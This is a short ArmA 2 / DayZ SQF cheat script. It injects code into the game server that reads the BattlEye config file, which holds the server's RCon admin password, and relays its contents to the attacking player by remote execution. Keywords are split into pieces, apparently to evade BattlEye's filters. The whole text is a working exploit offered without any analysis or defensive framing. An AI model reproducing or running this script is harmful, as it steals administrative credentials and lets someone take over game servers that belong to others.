_rcon = format["if (isServer) then
{
	call compile (""temp1 = load"" + ""file (""""cfgdayz\battleye\config.cfg"""");"");
	call compile (""[nil, nil, rSP"" + ""AWN, [temp1], {if (name player == """"%3"""") then {cutText [_this select 0, """"PLAIN""""]; diag_log (_this select 0);};}] call RE;"");
}", str(dayz_instance), worldName, name player];
[_rcon] execVM "exec.sqf";